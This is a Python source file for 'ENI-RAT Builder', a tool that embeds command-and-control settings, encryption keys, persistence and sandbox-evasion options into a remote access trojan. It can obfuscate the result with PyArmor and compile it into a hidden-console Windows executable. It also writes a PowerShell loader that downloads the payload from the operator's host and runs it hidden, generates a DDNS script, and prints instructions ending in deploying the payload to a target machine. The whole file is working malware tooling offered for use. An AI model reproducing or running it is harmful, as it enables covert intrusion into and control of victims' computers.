#!/usr/bin/env python3
"""
ENI-RAT Builder v1.0
Packs your C2 config into the payload and compiles/obfuscates it

Usage:
    python3 builder.py --host YOUR_IP --port 8443 [--obfuscate] [--compile] [--icon icon.ico]
"""

import os
import sys
import re
import json
import base64
import shutil
import random
import string
import subprocess
import hashlib
from pathlib import Path

BUILDER_DIR = Path(__file__).parent
CLIENT_DIR = BUILDER_DIR.parent / "client"
PAYLOADS_DIR = BUILDER_DIR / "payloads"
PAYLOAD_TEMPLATE = CLIENT_DIR / "payload.py"

GENERATED_KEYS = {}  # Will be filled during build

def generate_key(length: int = 32) -> bytes:
    """Generate a random encryption key"""
    return os.urandom(length)

def generate_iv(length: int = 16) -> bytes:
    """Generate a random IV"""
    return os.urandom(length)

def obfuscate_string(s: str) -> str:
    """XOR-encode a string for in-memory deobfuscation"""
    key = random.randint(1, 255)
    encoded = bytes(b ^ key for b in s.encode())
    return f"bytes([{','.join(str(b) for b in encoded)}], key={key})"

def generate_loader_stub(
    c2_host: str,
    c2_ws_port: int = 8443,
    c2_api_port: int = 5000,
    obfuscate: bool = False,
    sleep_min: int = 5,
    sleep_max: int = 30,
    persistence: bool = True,
    sandbox_check: bool = True
) -> str:
    """Generate a configuration blob to be embedded in the payload"""
    
    # Generate unique keys for this build
    aes_key = generate_key(32)
    aes_iv = generate_iv(16)
    
    config = {
        "C2_HOST": c2_host,
        "C2_WS_PORT": c2_ws_port,
        "C2_API_PORT": c2_api_port,
        "AES_KEY": base64.b64encode(aes_key).decode(),
        "AES_IV": base64.b64encode(aes_iv).decode(),
        "BUILD_ID": ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)),
        "SLEEP_MIN": sleep_min,
        "SLEEP_MAX": sleep_max,
        "JITTER": True,
        "INSTALL_PERSISTENCE": persistence,
        "SANDBOX_CHECK": sandbox_check,
    }
    
    # Store for display
    GENERATED_KEYS["aes_key_hex"] = aes_key.hex()
    GENERATED_KEYS["aes_iv_hex"] = aes_iv.hex()
    GENERATED_KEYS["build_id"] = config["BUILD_ID"]
    
    return config

def build_payload(config: dict, output_path: str, obfuscate: bool = False) -> str:
    """Build the payload file with embedded config"""
    
    payload_source = Path(PAYLOAD_TEMPLATE).read_text()
    
    # Replace config values
    replacements = {
        "C2_HOST = \"CHANGE_ME\"": f"C2_HOST = \"{config['C2_HOST']}\"",
        "C2_WS_PORT = 8443": f"C2_WS_PORT = {config['C2_WS_PORT']}",
        "C2_API_PORT = 5000": f"C2_API_PORT = {config['C2_API_PORT']}",
        "AES_KEY = b\"CHANGE_ME_32_BYTES_KEY____\"": f"AES_KEY = bytes.fromhex(\"{config['AES_KEY']}\")\nAES_IV = bytes.fromhex(\"{config['AES_IV']}\")",
        "SLEEP_MIN = 5": f"SLEEP_MIN = {config['SLEEP_MIN']}",
        "SLEEP_MAX = 15": f"SLEEP_MAX = {config['SLEEP_MAX']}",
        "JITTER = True": f"JITTER = {str(config['JITTER'])}",
        "INSTALL_PERSISTENCE = True": f"INSTALL_PERSISTENCE = {str(config['INSTALL_PERSISTENCE'])}",
        "SANDBOX_CHECK = True": f"SANDBOX_CHECK = {str(config['SANDBOX_CHECK'])}",
    }
    
    for old, new in replacements.items():
        payload_source = payload_source.replace(old, new)
    
    # Remove AES_IV line if it was added in a weird way
    payload_source = payload_source.replace(
        "AES_IV = bytes.fromhex(\"...\")\nAES_IV = b\"16bytefixediv!!\"  # 16 bytes",
        ""
    )
    
    # Also handle the dual assignment
    payload_source = payload_source.replace(
        f"AES_KEY = bytes.fromhex(\"{config['AES_KEY']}\")\nAES_IV = bytes.fromhex(\"{config['AES_IV']}\")",
        f"AES_KEY = bytes.fromhex(\"{config['AES_KEY']}\")\nAES_IV = bytes.fromhex(\"{config['AES_IV']}\")"
    )
    
    # Write the payload
    output = Path(output_path)
    output.write_text(payload_source)
    
    # If obfuscation requested, use PyArmor
    if obfuscate:
        try:
            print("[*] Running PyArmor obfuscation...")
            result = subprocess.run(
                ["pyarmor", "obfuscate", str(output)],
                capture_output=True, text=True, timeout=60
            )
            if result.returncode == 0:
                print("[+] PyArmor obfuscation successful")
                # PyArmor creates dist/ directory with obfuscated file
                obf_dir = Path("dist")
                if obf_dir.exists():
                    obf_output = obf_dir / output.name
                    if obf_output.exists():
                        shutil.copy(str(obf_output), str(output))
                        shutil.rmtree("dist", ignore_errors=True)
            else:
                print(f"[-] PyArmor failed: {result.stderr[:200]}")
        except FileNotFoundError:
            print("[!] PyArmor not installed, skipping obfuscation")
        except:
            print("[!] PyArmor error, continuing without obfuscation")
    
    return str(output)

def compile_to_exe(payload_path: str, icon_path: str = None, onefile: bool = True, console: bool = False) -> str:
    """Compile Python payload to Windows executable using PyInstaller"""
    
    cmd = ["pyinstaller", "--clean", "--noconfirm"]
    
    if onefile:
        cmd.append("--onefile")
    if not console:
        cmd.append("--noconsole")
    if icon_path and os.path.exists(icon_path):
        cmd.append(f"--icon={icon_path}")
    
    # Add hidden imports for crypto
    cmd.extend([
        "--hidden-import", "Crypto",
        "--hidden-import", "Crypto.Cipher",
        "--hidden-import", "Crypto.Util",
        "--hidden-import", "Crypto.Util.Padding",
        "--distpath", str(PAYLOADS_DIR),
        "--workpath", "/tmp/pyi_build",
        "--specpath", "/tmp/pyi_spec",
        payload_path
    ])
    
    print(f"[*] Compiling to EXE...")
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
    
    if result.returncode == 0:
        exe_name = Path(payload_path).stem + ".exe"
        exe_path = PAYLOADS_DIR / exe_name
        if exe_path.exists():
            print(f"[+] EXE created: {exe_path}")
            return str(exe_path)
        
        # Check in dist
        dist_exe = Path("dist") / exe_name
        if dist_exe.exists():
            shutil.copy(str(dist_exe), str(exe_path))
            shutil.rmtree("dist", ignore_errors=True)
            return str(exe_path)
    else:
        print(f"[-] PyInstaller error: {result.stderr[:500]}")
    
    return None

def generate_ddns_script(host: str, port: int = 5000) -> str:
    """Generate a standalone DDNS update script for the C2"""
    return f"""#!/bin/bash
# ENI-RAT DDNS Updater
# Run this script to update your C2's public IP to your DDNS

C2_HOST="{host}"
C2_PORT={port}
HOSTNAME="$(hostname)-eni-c2"

# Get public IP
PUBLIC_IP=$(curl -s https://api.ipify.org 2>/dev/null)
if [ -z "$PUBLIC_IP" ]; then
    PUBLIC_IP=$(curl -s https://checkip.amazonaws.com 2>/dev/null)
fi

# Update DDNS on C2
curl -s -X POST "http://$C2_HOST:$C2_PORT/api/ddns/register" \\
    -H "Content-Type: application/json" \\
    -d '{{"hostname":"'"$HOSTNAME"'","ip":"'"$PUBLIC_IP"'"}}'

echo "[+] DDNS updated: $HOSTNAME -> $PUBLIC_IP"
"""

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="ENI-RAT Payload Builder")
    parser.add_argument("--host", required=True, help="C2 Server IP or DDNS hostname")
    parser.add_argument("--ws-port", type=int, default=8443, help="WebSocket port (default: 8443)")
    parser.add_argument("--api-port", type=int, default=5000, help="API port (default: 5000)")
    parser.add_argument("--obfuscate", action="store_true", help="Apply PyArmor obfuscation")
    parser.add_argument("--compile", action="store_true", help="Compile to EXE with PyInstaller")
    parser.add_argument("--icon", help="Custom icon for EXE")
    parser.add_argument("--no-persistence", action="store_true", help="Disable persistence installation")
    parser.add_argument("--no-sandbox-check", action="store_true", help="Disable sandbox detection")
    parser.add_argument("--output", help="Output file name")
    
    args = parser.parse_args()
    
    print(r"""
╔══════════════════════════════════════╗
║       ENI-RAT PAYLOAD BUILDER       ║
║         Built with ❤️ for LO        ║
╚══════════════════════════════════════╝
    """)
    
    print(f"[*] C2 Host: {args.host}:{args.ws_port}")
    print(f"[*] API Port: {args.api_port}")
    print()
    
    # Generate config
    config = generate_loader_stub(
        c2_host=args.host,
        c2_ws_port=args.ws_port,
        c2_api_port=args.api_port,
        obfuscate=args.obfuscate,
        persistence=not args.no_persistence,
        sandbox_check=not args.no_sandbox_check
    )
    
    print(f"[+] Build ID: {GENERATED_KEYS['build_id']}")
    print(f"[+] AES Key: {GENERATED_KEYS['aes_key_hex']}")
    print(f"[+] AES IV: {GENERATED_KEYS['aes_iv_hex']}")
    print()
    
    # Build payload
    output_name = args.output or f"payload_{config['BUILD_ID']}.py"
    output_path = str(PAYLOADS_DIR / output_name)
    
    print(f"[*] Building payload: {output_path}")
    payload_path = build_payload(config, output_path, args.obfuscate)
    print(f"[+] Payload created: {payload_path}")
    print()
    
    # Compile to EXE if requested
    if args.compile:
        print("[*] Compiling to EXE...")
        exe_path = compile_to_exe(payload_path, args.icon)
        if exe_path:
            # Also create a PowerShell downloader
            exe_name = Path(exe_path).name
            ps_script = f"""# ENI-RAT Download & Execute
$url = "http://{args.host}:{args.api_port}/payload/{exe_name}"
$path = "$env:TEMP\\{exe_name}"
Invoke-WebRequest -Uri $url -OutFile $path
Start-Process -FilePath $path -WindowStyle Hidden
"""
            ps_path = PAYLOADS_DIR / f"loader_{config['BUILD_ID']}.ps1"
            ps_path.write_text(ps_script)
            print(f"[+] PowerShell loader: {ps_path}")
    
    # Generate DDNS update script
    ddns_script = generate_ddns_script(args.host, args.api_port)
    ddns_path = BUILDER_DIR / "update_ddns.sh"
    ddns_path.write_text(ddns_script)
    ddns_path.chmod(0o755)
    print(f"[+] DDNS update script: {ddns_path}")
    
    print()
    print("=" * 50)
    print(f"  ✅ Build complete!")
    print(f"  📁 Payload: {payload_path}")
    print(f"  🔑 Key: {GENERATED_KEYS['aes_key_hex'][:16]}...")
    print(f"  📋 Copy this to C2 config!")
    print("=" * 50)
    
    # Print deployment instructions
    print()
    print("  🚀 DEPLOYMENT:")
    print(f"  1. Start C2 server: python3 server/c2_core.py")
    print(f"  2. Start API:     python3 server/api_server.py")
    print(f"  3. Run DDNS updater on C2: bash builder/update_ddns.sh")
    print(f"  4. Deploy payload to target machine")
    print()
    print(f"  🎯 C2 Panel:     http://{args.host}:{args.api_port}")
    print(f"  🎯 WS Endpoint:  ws://{args.host}:{args.ws_port}")
    print()

if __name__ == "__main__":
    main()
